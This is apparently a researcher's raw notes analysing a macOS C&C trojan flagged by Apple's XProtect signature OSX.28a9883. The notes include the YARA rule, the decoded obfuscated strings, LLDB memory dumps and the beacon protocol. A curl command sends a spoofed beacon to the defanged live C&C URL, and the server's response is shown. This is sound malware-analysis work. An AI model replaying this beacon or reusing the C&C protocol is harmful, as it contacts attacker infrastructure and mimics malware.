---
title: Obfuscated Strings in Objective-C
categories:
  - Malware
tags:
  - macOS
  - LLDB
  - Objective-C
---

https://github.com/knightsc/XProtect/commit/11e2d334ad6669a3c0e5b51c703561d6d8931e9d#diff-392ce1bf29fe5173ffdc7d5ef2c03d37R12

```
rule XProtect_OSX_28a9883
{
    meta:
        description = "OSX.28a9883"
     strings:
        $a1 = { 3A 6C 61 62 65 6C 3A 70 6C 69 73 74 50 61 74 68 3A }
		$a2 = { 3A 62 69 6E 3A 70 6C 69 73 74 3A }
		$a3 = { 21 40 23 24 7E 5E 26 2A 28 29 5B 5D 7B 7D 3A 3B 3C 3E 2C 2E 31 71 32 77 33 65 34 72 35 74 36 79 37 75 38 69 39 6F 30 70 41 5A 53 58 44 43 46 56 47 42 48 4E 4A 4D 4B 4C 51 57 45 52 54 59 55 49 }
     condition:
        Macho and all of ($a*)
}
```
description = "OSX.28a9883"

:label:plistPath:
:bin:plist:
!@#$~^&*()[]{}:;<>,.1q2w3e4r5t6y7u8i9o0pAZSXDCFVGBHNJMKLQWERTYUI

https://www.virustotal.com/#/file/0b8cc9df1b6a1c11e9a758a2c4ed3a35e51a163ede0cfd172781ae9a4a059e93/details

iBVe5F>ESBIF = karma
~N<qU0e4tZqTwL#6 = uncooked
4CGGQ<2Sqe{4Xo0#$G = overprice
7,..:I)<AqXA,Xe) = strainer
JM)5}r5R]J&E;i! = distill

3@oYGJqe1AT@r@:7#^74Z7WC$7 = %@/LaunchAgents 

&qGy;,7 = “1” // 0x31

R9 = !@#$~^&*()[]{}:;<>,.1q2w3e4r5t6y7u8i9o0pAZSXDCFVGBHNJMKLQWERTYUI

0x10002b3e0
0xff

0x10002b3e0: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b3f0: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b400: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b410: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b420: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b430: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b440: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b450: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b460: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b470: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b480: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b490: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b4a0: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b4b0: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b4c0: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b4d0: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f

After first loop of cDecryptString

x/200x 0x10002b3e0
0x10002b3e0: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b3f0: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b400: 0x027f007f 0x7f067f03 0x7f070908 0x7f137f12
0x10002b410: 0x18161426 0x201e1c1a 0x0f0e2422 0x7f117f10
0x10002b420: 0x2d312801 0x302e3a2c 0x36343f32 0x7f333537
0x10002b430: 0x2a3b387f 0x392f3e3c 0x0a293d2b 0x7f050b7f
0x10002b440: 0x7f7f7f7f 0x7f7f197f 0x7f7f237f 0x257f7f7f
0x10002b450: 0x7f1b1527 0x177f211d 0x0c7f1f7f 0x7f040d7f
0x10002b460: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b470: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b480: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b490: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b4a0: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b4b0: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b4c0: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f
0x10002b4d0: 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f 0x7f7f7f7f

URL https://www[.]getstranto[.]club/agent/
Accept: application/json
Content-Type: application/json; charset=UTF-8
POST

json body
{
Id. IOPlatformUUID
v “1”
g. “?”
}



curl -i \
-H "Accept: application/json" \
-H "Content-Type: application/json; charset=UTF-8" \
-X POST \
-d ‘{id: "818e9fa0-733b-43a4-a54a-968141dbc67e", v:"1",g:""}’ \
https://www[.]getstranto[.]club/agent/


"cmd”:"ping"

"cmd”:"execreply"

"cmd":"log"
"Msg":


Seems to be just a simple C&C trojan. Installs itself as a LaunchAgent and then tries to connect to C&C
```curl -i -H "Accept: application/json" -H "Content-Type: application/json; charset=UTF-8" -X POST -d '{"id": "818e9fa0-733b-43a4-a54a-968141dbc67e", "v":"1", "g":""}' https://www[.]getstranto[.]club/agent/

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Cache-Control: no-cache, private
Date: Wed, 15 Aug 2018 16:02:07 GMT

{"result":"schedule","sleep":"770","count":0}```

It’s just weird that in the XProtect 2099 file Apple didn’t give it a name and just called it `OSX.28a9883`